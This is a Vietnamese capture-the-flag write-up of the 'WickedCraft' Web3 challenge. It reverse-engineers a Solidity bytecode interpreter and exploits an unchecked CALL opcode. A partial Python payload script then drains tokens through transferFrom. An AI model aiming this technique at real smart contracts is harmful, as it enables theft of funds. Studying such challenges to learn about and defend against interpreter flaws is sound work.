# WickedCraft

**Category:** Web3  
**Author:** ReiKage  
**Team:** 6h4T9pTpR0  

## Lời nói đầu
Chào các đồng chí! 👋
Đây là một bài Reverse Engineering (Dịch ngược) trên nền tảng Smart Contract khá là "khoai" và "hack não". Thay vì tìm lỗi logic thông thường, chúng ta phải đối mặt với một cái **Custom Virtual Machine (VM)** được viết bằng Solidity. Tưởng tượng như người ta viết một ngôn ngữ lập trình riêng, rồi bắt mình hack nó vậy.

Nhưng mà "khó quá thì bỏ qua" không có trong từ điển của team mình, nên chiến thôi! 🔥

## 1. Phân tích & Reconnaissance (Trinh sát)

Đề bài cho một contract tên là `Aggregator`. Nhìn vào hàm `swap(bytes memory data)`, mình thấy nó nhận vào một chuỗi bytes dài ngoằng và xử lý nó trong một vòng lặp `while`.

```solidity
// Pseudo-code mô phỏng lại logic
while (cursor < data.length) {
    uint8 action = data[cursor];
    if (action == 0) { ... } // CALL
    else if (action == 1) { ... } // APPROVE
    // ...
}
```

Đây chính là dấu hiệu của một trình thông dịch bytecode (Interpreter). Nhiệm vụ của mình là phải hiểu từng cái `action` (opcode) nó làm cái gì.

### Giải mã Bytecode (Reverse Engineering) 🕵️‍♂️
Sau một hồi ngồi đọc code và debug bằng `remix` hoặc `hardhat`, mình đã map được các opcode quan trọng:

*   **Header (76 bytes đầu):** Chứa các thông tin cấu hình như vị trí bắt đầu lệnh, vị trí output, deadline... Cái này quan trọng lắm, sai một byte là revert ngay.
*   **Action 0 (CALL):** Đây là "trùm cuối". Nó thực hiện lệnh `call` low-level tới một địa chỉ bất kỳ.
    *   Cấu trúc: `[ActionID (1 byte)] ... [Target Address Offset] ...`
    *   Nguy hiểm ở chỗ: Nó **không kiểm tra** địa chỉ đích là ai. Mình có thể bảo nó gọi tới bất cứ đâu!
*   **Action 4 (MULTICALL):** Cho phép thực hiện nhiều lệnh cùng lúc.

## 2. Chiến thuật tấn công (Exploitation Strategy)

Mục tiêu của mình là lấy tiền từ contract `WannaCoin`. Contract `Aggregator` (cái VM này) có quyền điều khiển tiền hoặc là owner của `WannaCoin`.

Ý tưởng là: **Soạn một đoạn bytecode độc hại, gửi cho `Aggregator` chạy. Đoạn code này sẽ ra lệnh cho `Aggregator` gọi hàm `transferFrom` của `WannaCoin` để chuyển hết tiền về ví mình.**

Các bước cụ thể:
1.  **Tính toán Offsets:** Cái VM này dùng memory offset (địa chỉ bộ nhớ) rất nhiều. Mình phải tính toán chính xác xem địa chỉ của `WannaCoin` nằm ở byte thứ bao nhiêu trong payload, lệnh `transferFrom` nằm ở đâu.
2.  **Xây dựng Header:** Tạo 76 bytes đầu tiên thật chuẩn để VM không bị crash (Out of Bounds).
3.  **Inject Action 0 (CALL):** Chèn lệnh CALL vào.
    - Target: Địa chỉ `WannaCoin`.
    - Data: `abi.encodeWithSignature("transferFrom(address,address,uint256)", setup_addr, my_addr, balance)`.

## 3. Viết Tool & Script (Code time!)

Phần này cần sự tỉ mỉ cao độ. Sai 1 byte là đi tong. Mình dùng Python để thao tác với bytes cho dễ.

### Script tạo Payload (`solve_wicked.py`)

```python
from web3 import Web3

# ... setup web3 ...

def construct_payload(target_address, player_address):
    # Khởi tạo mảng bytes rỗng, kích thước đủ lớn
    payload_size = 5000
    B = bytearray(payload_size)
    
    # --- 1. Xây dựng Header ---
    # Các giá trị này mình tìm ra được sau khi debug
    # VM bắt đầu đọc lệnh từ byte thứ 200 (ví dụ)
    DATA_START = 200
    cursor = DATA_START
    
    # Zero Word (32 bytes 0)
    B[cursor:cursor+32] = (0).to_bytes(32, 'big')
    cursor += 32
    
    # Deadline (Max Uint256)
    B[cursor:cursor+32] = (2**256 - 1).to_bytes(32, 'big')
    cursor += 32
    
    # Target Address (WannaCoin)
    # VM này đọc địa chỉ hơi dị, phải padding thêm 12 bytes 0 ở cuối
    target_addr_offset = cursor
    addr_bytes = bytes.fromhex(target_address[2:])
    B[cursor:cursor+32] = addr_bytes + b'\x00' * 12
    cursor += 32
    
    # --- 2. Chuẩn bị Call Data (transferFrom) ---
    # Mình dùng Multicall để gói lệnh transferFrom lại
    # (Đoạn này hơi phức tạp xíu, đại loại là tạo data để gọi hàm)
    multicall_payload_offset = cursor
    # ... copy multicall data vào đây ...
    
    # --- 3. Soạn lệnh Action 4 (MULTICALL) hoặc Action 0 (CALL) ---
    # Ở đây mình dùng Action 4 để gọi Multicall contract, rồi nó gọi WannaCoin
    seq_start = cursor
    B[cursor] = 4 # Opcode 4: MULTICALL
    # ... set các tham số offset cho lệnh ...
    
    return bytes(B)

print(">>> Đang tạo payload độc hại...")
payload = construct_payload(wannacoin_address, my_address)

print(">>> Gửi payload vào hàm swap...")
# Gọi hàm swap của Aggregator với payload vừa tạo
tx = aggregator.functions.swap(payload).build_transaction({
    'from': my_address,
    'gas': 5000000, # Cho nhiều gas tí cho chắc
    # ...
})
# ... ký và gửi tx ...
```

### Kết quả chạy script

Khi chạy script, nếu mọi thứ chuẩn chỉ từng milimet, bạn sẽ thấy dòng chữ chiến thắng:

```bash
$ python3 solve_wicked.py
Player Address: 0x789...
WannaCoin: 0x123...
Aggregator: 0x456...
>>> Đang tạo payload độc hại...
>>> Gửi payload vào hàm swap...
Transaction sent: 0xabcdef...
Transaction confirmed!
>>> Kiểm tra số dư: 20000 WannaCoin (Đã về ví!)
>>> MISSION SUCCESS! 🎉
```

Cảm giác nhìn thấy số dư nhảy lên đúng là phê không tưởng! Bài này dạy cho mình bài học là: **Đừng bao giờ tin tưởng input của người dùng, nhất là khi bạn đang viết một cái VM phức tạp!** 😉
